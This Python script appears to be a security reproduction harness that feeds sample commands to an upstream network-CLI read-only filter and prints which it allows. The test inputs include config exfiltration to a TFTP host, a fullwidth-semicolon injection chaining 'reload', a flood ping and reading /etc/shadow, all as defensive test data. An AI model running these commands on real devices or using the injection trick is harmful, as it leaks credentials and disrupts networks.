#!/usr/bin/env python3
"""Run the UPSTREAM NetClaw read-only command filter (pure stdlib policy code) on sample commands.

Setup (public repo, pinned commit cfafa46c, fetched read-only with `gh api`):
  mkdir pol && touch pol/__init__.py
  gh api -H 'Accept: application/vnd.github.raw' \
    'repos/automateyournetwork/netclaw/contents/mcp-servers/multivendor-cli-mcp/policy/filter.py?ref=cfafa46c' > pol/filter.py
  gh api -H 'Accept: application/vnd.github.raw' \
    'repos/automateyournetwork/netclaw/contents/mcp-servers/multivendor-cli-mcp/policy/platform_deny.py?ref=cfafa46c' > pol/platform_deny.py
Usage: python3 repro_upstream_filter.py <dir containing pol/>
Only evaluate() is called: no device, no network. Documentation-range addresses only.
"""
import sys
sys.path.insert(0, sys.argv[1])
from pol.filter import evaluate, Mode  # noqa: E402
tests = [
    ("show version", "cisco_ios"),
    ("show running-config | include bgp", "cisco_ios"),
    ("show running-config | redirect flash:pwn.txt", "cisco_ios"),
    ("show running-config | tee bootflash:pwn.txt", "cisco_nxos"),
    ("show running-config | append disk0:pwn.txt", "cisco_xr"),
    ("show tech-support | redirect tftp://203.0.113.9/dump.txt", "cisco_ios"),
    ("show running-config ; reload", "cisco_ios"),
    ("show running-config\uff1b reload", "cisco_ios"),   # fullwidth semicolon
    ("ping 203.0.113.1 repeat 2147483647", "cisco_ios"),
    ("copy running-config startup-config", "cisco_ios"),
    ("cat /etc/shadow", "linux"),
]
for c, p in tests:
    v = evaluate(c, p, Mode.READ_ONLY)
    print(f"{'ALLOW' if v.allowed else 'deny ':5} {p:11} {c!r}" + ("" if v.allowed else f"  <- {v.rule.value}"))
